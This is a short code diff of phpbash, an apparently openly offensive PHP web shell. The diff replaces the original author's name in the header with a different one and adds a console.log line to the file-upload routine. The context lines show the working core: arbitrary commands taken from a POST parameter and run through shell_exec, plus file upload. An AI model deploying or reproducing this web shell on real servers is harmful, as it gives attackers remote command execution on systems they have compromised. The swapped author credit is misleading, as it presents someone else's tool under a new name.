@@ -1,5 +1,5 @@
 <?php
-/* phpbash by Alexander Reid (Arrexel) */
+/* phpbash by LAMINE AZINAKOU */
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
@@ -236,6 +236,7 @@ if (ISSET($_POST['cmd'])) {
                 request.open("POST", "", true);
                 request.send(formData);
                 outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
+                console.log("OK");
             }
             
             function updateInputWidth() {
